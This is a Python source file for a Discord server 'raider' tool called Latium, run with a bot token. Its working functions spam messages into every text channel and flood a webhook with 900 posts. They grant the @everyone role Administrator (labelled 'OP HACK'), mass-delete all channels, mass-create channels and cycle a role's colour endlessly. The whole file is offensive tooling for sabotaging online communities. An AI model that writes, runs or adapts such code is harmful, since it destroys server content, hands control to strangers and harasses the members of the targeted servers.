import asyncio
import os
import sys
import aiohttp
import json
from websocket import *
import requests
from colorama import Fore, Style
from datetime import datetime
from pystyle import Colors, Colorate, System, Write

System.Title("administrator: Latium - (1/2)")
os.system("cls")

now = datetime.now().strftime("%H:%M:%S")

def load_token(filename='token.txt'):
    try:
        with open(filename, 'r') as file:
            return file.read().strip()
    except FileNotFoundError:
        print(f'Error: The file {filename} was not found.')
        return None

Token = load_token()

HEADERS = {
    'Authorization': f'Bot {Token}',
    'Content-Type': 'application/json'
}

BASE_URL = 'https://discord.com/api/v10'

Logo = """
                                ██╗      █████╗ ████████╗██╗██╗   ██╗███╗   ███╗
                                ██║     ██╔══██╗╚══██╔══╝██║██║   ██║████╗ ████║
                                ██║     ███████║   ██║   ██║██║   ██║██╔████╔██║  [>] Next Page
                                ██║     ██╔══██║   ██║   ██║██║   ██║██║╚██╔╝██║  [?] Credit
                                ███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚═╝ ██║  [ex] Exit
                                ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝     ╚═╝  [!] Help
"""

Logo2 = """
                                ██╗      █████╗ ████████╗██╗██╗   ██╗███╗   ███╗
                                ██║     ██╔══██╗╚══██╔══╝██║██║   ██║████╗ ████║
                                ██║     ███████║   ██║   ██║██║   ██║██╔████╔██║  [<] Back Page
                                ██║     ██╔══██║   ██║   ██║██║   ██║██║╚██╔╝██║  [?] Credit
                                ███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚═╝ ██║  [ex] Exit
                                ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝     ╚═╝  [!] Help
"""


now = datetime.now().strftime("%H:%M:%S")

def op(func):
    async def wrapper(*args, **kwargs):
        print(f"{now:<20} Starting operation: {func.__name__}")
        result = await func(*args, **kwargs)
        print(f"{now:<20} Operation finished: {func.__name__}")
        return result
    return wrapper

@op
async def assign_admin_to_everyone(guild_id):
    async with aiohttp.ClientSession() as session:
        async with session.get(f'{BASE_URL}/guilds/{guild_id}/roles', headers=HEADERS) as response:
            roles = await response.json()
        
        # Find the @everyone role
        everyone_role = next((role for role in roles if role['name'] == '@everyone'), None)
        if not everyone_role:
            print(f"{now:<20} @everyone role not found.")
            return

        permissions = everyone_role.get('permissions', 0)
        if isinstance(permissions, str):
            permissions = int(permissions)
        
        new_permissions = permissions | 0x8
        
        role_data = {
            'permissions': new_permissions
        }
        async with session.patch(f'{BASE_URL}/guilds/{guild_id}/roles/{everyone_role["id"]}', headers=HEADERS, json=role_data) as response:
            if response.status == 200:
                print(Colorate.Horizontal(Colors.blue_to_cyan, f"{now:<20} Successfully Hacked Administrator", 1))
                os.system("cls")
                await onemenu()
            else:
                print(Colorate.Horizontal(Colors.blue_to_cyan, f"{now:<20} {now:<20} Failed to assign Administrator : {response.status}", 1))
                os.system("cls")
                await onemenu()

async def main():
    guild_id = Write.Input("@LATIUM/Raider/OPHACK/Guild ID/<~>>:  ", Colors.blue_to_cyan, interval=0.0000)
    await assign_admin_to_everyone(guild_id)


async def create_rainbow_role():
    COLOR_START = 0xFF0000 
    headers = {
        'Authorization': f'Bot {Token}',
        'Content-Type': 'application/json'
    }
    
    Guildid = Write.Input("@LATIUM/Raider/Rainbow/Guild ID/<~>>:  ", Colors.blue_to_cyan, interval=0.0000)
    ROLE_NAME = Write.Input("@LATIUM/Raider/Rainbow/RoleName/<~>>:  ", Colors.blue_to_cyan, interval=0.0000)
    
    async with aiohttp.ClientSession() as session:
        async with session.get(f'https://discord.com/api/v10/guilds/{Guildid}', headers=headers) as resp:
            guild_info = await resp.json()

        role_data = {
            'name': ROLE_NAME,
            'color': COLOR_START,
            'hoist': False,
            'mentionable': False
        }
        
        async with session.post(f'https://discord.com/api/v10/guilds/{Guildid}/roles', json=role_data, headers=headers) as resp:
            role = await resp.json()
            role_id = role['id']
        
        print(f'Role created: {role_id}')
        
        while True:
            for i in range(6):
                color = (COLOR_START + (i * 0x003333)) % 0xFFFFFF  
                role_data = {
                    'color': color
                }
                async with session.patch(f'https://discord.com/api/v10/guilds/{Guildid}/roles/{role_id}', json=role_data, headers=headers) as resp:
                    print(f'Role color updated to: {hex(color)}')
                await asyncio.sleep(5)  

async def webhookspammer():
    webhookurl = Write.Input("@LATIUM/Raider/WebhookSpam/URL/<~>>:  ", Colors.blue_to_cyan, interval=0.0000)
    username = Write.Input("@LATIUM/Raider/WebhookSpam/Username/<~>>:  ", Colors.blue_to_cyan, interval=0.0000)
    message = Write.Input("@LATIUM/Raider/WebhookSpam/Message/<~>>:  ", Colors.blue_to_cyan, interval=0.0000)

    headerwebhook = {
        "username": username,
        "content": message
    }

    now = datetime.now()
    
    for i in range(900):
        try:
            response = requests.post(webhookurl, json=headerwebhook)
            if response.status_code == 204:
                print(f'{now:<20}Sent Successfully')
            else:
                print(f'{now:<20} Failed Sent {response.status_code}')
        except requests.RequestException as e:
            print(f'{now:<20} Error: {str(e)}')

async def channel(session, channel_id):
    url = f'{BASE_URL}/channels/{channel_id}'
    async with session.get(url, headers=HEADERS) as response:
        if response.status == 200:
            return await response.json()
        else:
            print(Colorate.Horizontal(Colors.blue_to_cyan, f"{now:<20} {channel_id} Failed Info Load: {response.status}", 1))
            return None

async def delete_channel(session, channel_id):
    url = f'{BASE_URL}/channels/{channel_id}'
    async with session.delete(url, headers=HEADERS) as response:
        if response.status == 204:
            return channel_id, True
        else:
            print(Colorate.Horizontal(Colors.blue_to_cyan, f"{now:<20} {channel_id} Channel Deleted {response.status}", 1))
            return channel_id, False

async def get_channels(session, guild_id):
    url = f'{BASE_URL}/guilds/{guild_id}/channels'
    async with session.get(url, headers=HEADERS) as response:
        if response.status == 200:
            return await response.json()
        else:
            print(Colorate.Horizontal(Colors.blue_to_cyan, f"{now:<20} Failed Info Load: {response.status}", 1))
            return []

async def deleter():
    guild_id = input("Guild ID: ")

    async with aiohttp.ClientSession() as session:
        channels = await get_channels(session, guild_id)
        
        if not channels:
            print(Colorate.Horizontal(Colors.blue_to_cyan, f"{now:<20} Delete Channel Not Found", 1))
            await onemenu()
            return
        
        delete_tasks = [delete_channel(session, channel['id']) for channel in channels]
        results = await asyncio.gather(*delete_tasks)
        
        for channel_id, success in results:
            if success:
                print(Colorate.Horizontal(Colors.blue_to_cyan, f"{now:<20} {channel_id} Channel Deleted Successfully", 1))
            else:
                print(Colorate.Horizontal(Colors.blue_to_cyan, f"{now:<20} {channel_id} Failded Delete: ", 1))
            await asyncio.sleep(10)

    await onemenu()

async def create_channel(guild_id, channel_name, channel_type):
    if channel_type == 'text':
        data = {
            'name': channel_name,
            'type': 0
        }
    elif channel_type == 'voice':
        data = {
            'name': channel_name,
            'type': 2
        }
    else:
        print('Invalid channel type. Please enter "text" or "voice".')
        return

    retry_attempts = 3
    rate = f"{now:<20} Rate limited. Retrying in {{retry_after}} seconds..."
    Success = f"{now:<20} Channel {channel_name} created successfully."
    for attempt in range(retry_attempts):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=HEADERS, json=data) as response:
                    if response.status == 201:
                        print(Colorate.Horizontal(Colors.blue_to_cyan, Success, 1))
                        return
                    elif response.status == 429:
                        retry_after = float((await response.json()).get('retry_after', 1)) / 1000
                        print(Colorate.Horizontal(Colors.blue_to_cyan, rate.format(retry_after=retry_after), 1))
                        await asyncio.sleep(retry_after)
                    else:
                        print(Colorate.Horizontal(Colors.blue_to_cyan, f"{now:<20} Failed to create channel. Status code: {response.status}", 1))
                        print('Response:', await response.text())
                        return
        except aiohttp.ClientError as e:
            print(f'An error occurred: {e}')
        await asyncio.sleep(2 ** attempt)

    print(f'Failed to create channel "{channel_name}" after {retry_attempts} attempts.')

async def channel_creation():
    channel_name = Write.Input("@LATIUM/Raider/CreateChannel/Name/<~>>:  ", Colors.blue_to_cyan, interval=0.0000)
    channel_type = Write.Input("@LATIUM/Raider/CreateChannel/Type/text/voice/<~>>:  ", Colors.blue_to_cyan, interval=0.0000)
    guild_id = Write.Input("@LATIUM/Raider/CreateChannel/Guild ID/<~>>:  ", Colors.blue_to_cyan, interval=0.0000)
    
    try:
        num_channels = int(input("Enter the number of channels to create: ").strip())
        if num_channels <= 0:
            print(Colorate.Horizontal(Colors.blue_to_cyan, f"{now:<20} The number of channels must be greater than zero.", 1))
            return
    except ValueError:
        print(Colorate.Horizontal(Colors.blue_to_cyan, f"{now:<20} Invalid number of channels. Please enter a positive integer.", 1))
        return
    
    tasks = [create_channel(guild_id, f"{channel_name}{i+1}", channel_type) for i in range(num_channels)]
    await asyncio.gather(*tasks)

    await onemenu()

import websockets
async def update_status(token, status_name, status_type):
    url = 'https://discord.com/api/v10/users/@me/settings'
    headers = {
        'Authorization': f'Bot {Token}',
        'Content-Type': 'application/json'
    }
    data = {
        'status': 'online',  
        'activities': [
            {
                'name': status_name,
                'type': status_type  
            }
        ]
    }

    async with aiohttp.ClientSession() as session:
        async with session.patch(url, headers=headers, json=data) as response:
            if response.status == 200:
                print("Status updated successfully")
            else:
                print(f"Failed to update status. Status code: {response.status}")
                print(await response.text())

async def send_message(session, channel_id, message):
    url = f'{BASE_URL}/channels/{channel_id}/messages'
    data = {
        'content': message
    }
    async with session.post(url, headers=HEADERS, json=data) as response:
        if response.status == 200:
            print(Colorate.Horizontal(Colors.blue_to_cyan, f"{now:<20} Sent message to channel {channel_id}", 1))
        else:
            print(Colorate.Horizontal(Colors.blue_to_cyan, f"{now:<20} Failed to send message to channel {channel_id}. Status code: {response.status}", 1))

async def get_text_channels(session, guild_id):
    url = f'{BASE_URL}/guilds/{guild_id}/channels'
    async with session.get(url, headers=HEADERS) as response:
        if response.status == 200:
            channels = await response.json()
            return [channel['id'] for channel in channels if channel['type'] == 0]
        else:
            print(Colorate.Horizontal(Colors.blue_to_cyan, f"{now:<20} Failed to get channels. Status code: {response.status}", 1))
            return []

async def send_message_to_all_channels():
    guild_id = Write.Input("@LATIUM/Raider/Spammer/Guild ID/<~>>:  ", Colors.blue_to_cyan, interval=0.0000)
    message = Write.Input("@LATIUM/Raider/Spammer/Message/<~>>:  ", Colors.blue_to_cyan, interval=0.0000)
    
    num_times_str = Write.Input("@LATIUM/Raider/Spammer/SentCount/<~>>:  ", Colors.blue_to_cyan, interval=0.0000).strip()
    
    try:
        num_times = int(num_times_str) 
        if num_times <= 0:
            print(Colorate.Horizontal(Colors.blue_to_cyan, f"{now:<20} The number of messages must be greater than zero.", 1))
            return
    except ValueError:
        print(Colorate.Horizontal(Colors.blue_to_cyan, f"{now:<20} Invalid number of messages. Please enter a positive integer.", 1))
        return

    async with aiohttp.ClientSession() as session:
        channels = await get_text_channels(session, guild_id)
        if channels:
            for _ in range(num_times):
                tasks = [send_message(session, channel_id, message) for channel_id in channels]
                await asyncio.gather(*tasks)
                await asyncio.sleep(1) 
        else:
            print(Colorate.Horizontal(Colors.blue_to_cyan, f"{now:<20} No text channels found or failed to fetch channels.", 1))



async def update_discord_status(status_name, status_type=0):
    token = load_token()
    if token:
        await update_status(token, status_name, status_type)

async def Creditmenu():
    print(Colorate.Horizontal(Colors.blue_to_cyan, "yxxzs - System Design All", 1))
    os.system("pause")
    os.system("cls")
    await onemenu()

async def twomenu():
    System.Title("administrator: Latium - (2/2)")
    os.system("cls")
    print(Colorate.Horizontal(Colors.blue_to_cyan, Logo2, 1))
    print ("")
    print ("")
    print(Colorate.Horizontal(Colors.blue_to_cyan, "   [01] Bot Breaker             [00] ...                       [00] ...                     [00] ...     ", 1))
    print(Colorate.Horizontal(Colors.blue_to_cyan, "   [00] ...                     [00] ...                       [00] ...                     [00] ...     ", 1))
    print (" ")
    print (" ")
    print (" ")
    print(Colorate.Horizontal(Colors.blue_to_cyan, "   [00] ...                     [00] ...                       [00] ...                     [00] ...     ", 1))
    print(" ")
    print(" ")
    e2input = Write.Input("   @LATIUM/Raider/2/<~>>:  ", Colors.blue_to_cyan, interval=0.0000)
    if e2input == ">":
        await onemenu()
    elif e2input == "<":
        await onemenu()
    elif e2input == "ex":
        sys.exit()
    elif e2input == "?":
        await Creditmenu()
    elif e2input == "!":
        print("Go to https://github.com/Rain436/Latium-Tool/wiki")
        os.system("pause")

async def onemenu():
    System.Title("administrator: Latium - (1/2)")
    os.system("cls")
    print(Colorate.Horizontal(Colors.blue_to_cyan, Logo, 1))
    print ("")
    print ("")
    print(Colorate.Horizontal(Colors.blue_to_cyan, "   [01] Spammer                 [02] OP HACK                   [03] Id to UnBan                 [04] Create Channel     ", 1))
    print(Colorate.Horizontal(Colors.blue_to_cyan, "   [05] Delete Channel          [06] Onliner                   [07] DM SPAM                     [08] Guild Fucker     ", 1))
    print (" ")
    print (" ")
    print (" ")
    print(Colorate.Horizontal(Colors.blue_to_cyan, "   [09] Bot Info                [10] Status Changer            [11] Rainbow Role                [12] Webhook Spam ", 1))
    print(" ")
    print(" ")
    einput = Write.Input("   @LATIUM/Raider/<~>>:  ", Colors.blue_to_cyan, interval=0.0000)
    print (" ")
    print (" ")
    print (" ")
    await asyncio.sleep(1)

    if einput == ">":
        await twomenu()
    elif einput == "<":
        await twomenu()
    elif einput == "ex":
        sys.exit()
    elif einput == "?":
        await Creditmenu()
    elif einput == "!":
        print("Go to https://github.com/Rain436/Latium-Tool/wiki")
        os.system("pause")
    elif einput == "5":
        await deleter()
    elif einput == "10":
        status_message = Write.Input("@LATIUM/Raider/Changer/Status Message/<~>>:  ", Colors.blue_to_cyan, interval=0.0000)
        status_type_input = Write.Input("@LATIUM/Raider/Changer/Status Type/0 Play/<~>>:  ", Colors.blue_to_cyan, interval=0.0000)

        try:
            status_type = int(status_type_input)
        except ValueError:
            status_type = 0

        await update_discord_status(status_message, status_type)
    elif einput == "4":
        await channel_creation()
    elif einput == "1": 
        await send_message_to_all_channels()
    elif einput == "12":
        await webhookspammer()
    elif einput == "11":
        await create_rainbow_role()
    elif einput == "2":
        guild_id = Write.Input("@LATIUM/Raider/AssignAdmin/Guild ID/<~>>:  ", Colors.blue_to_cyan, interval=0.0000)
        await assign_admin_to_everyone(guild_id)


if __name__ == "__main__":
    asyncio.run(onemenu())
